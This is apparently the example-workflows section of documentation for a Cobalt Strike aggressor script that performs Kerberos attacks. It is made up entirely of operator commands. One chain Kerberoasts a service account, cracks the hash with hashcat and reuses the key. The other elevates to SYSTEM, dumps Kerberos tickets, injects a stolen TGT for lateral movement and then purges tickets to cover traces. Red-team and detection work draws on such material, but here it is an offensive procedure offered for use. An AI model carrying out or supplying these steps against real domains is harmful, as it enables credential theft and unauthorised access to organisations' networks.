# Example Workflows

## kerb_ops_inproc.cna

### 1) Kerberoast → crack → use:

    beacon> roast /user:svc_sql           # get the hash
    # (crack offline with hashcat -m 13100)
    beacon> opth svc_sql contoso.local <aes256-derived-from-cracked-pw>   # use it

### 2) Harvest → pass-the-ticket (lateral):

    beacon> getsystem                     # or your preferred elevation
    beacon> kdump                         # triage + dump; copy a target's TGT blob
    beacon> ptt <that-base64-blob>        # inject
    beacon> kdump                         # verify it's loaded
    # ... do your authenticated action ...
    beacon> kpurge                        # hygiene
